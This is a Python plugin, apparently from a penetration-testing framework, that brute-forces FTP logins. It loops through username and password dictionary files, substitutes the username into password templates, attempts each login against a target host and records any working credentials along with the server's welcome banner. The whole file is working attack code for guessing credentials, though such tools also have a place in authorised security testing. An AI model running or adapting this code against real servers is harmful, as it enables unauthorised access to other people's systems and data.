#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import ftplib
from script import Script, SERVICE_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.FTP
        self.name = 'ftp burst'
        self.keyword = ['FTP','weakpasss']
        self.info = 'FTP burst'
        self.type = 'rce'
        self.level = 'high'
        Script.__init__(self, target=target, service_type=self.service_type)

    def prove(self):
        ftp = ftplib.FTP()
        try:
            ftp.connect(self.target_host, self.target_port, timeout=3)
            ftp.quit()
        except Exception as e:
            return
        usernamedic = self.read_file(self.parameter['U']) if 'U' in self.parameter.keys() else self.read_file('dict/ftp_usernames.txt')
        passworddic = self.read_file(self.parameter['P']) if 'P' in self.parameter.keys() else self.read_file('dict/ftp_passwords.txt')
        anonymous = False
        flag = 3
        for linef1 in usernamedic:
            username = linef1.strip('\r').strip('\n')
            for linef2 in passworddic:
                try:
                    if username == 'anonymous':
                        if anonymous:
                            continue
                        else:
                            anonymous = True
                    password = (
                        linef2 if '%user%' not in linef2 else str(linef2).replace("%user%", str(username))).strip(
                        '\r').strip('\n')
                    ftp.connect(self.target_host, self.target_port,timeout=3)
                    ftp.login(username, password)
                    self.flag = 1
                    self.req.append({"username": username, "password": password})
                    self.res.append({"info": username + "/" + password, "key": ftp.getwelcome()})
                    ftp.quit()
                except Exception as e:
                    if "timed out" in str(e):
                        if flag == 0:
                            return
                        flag -= 1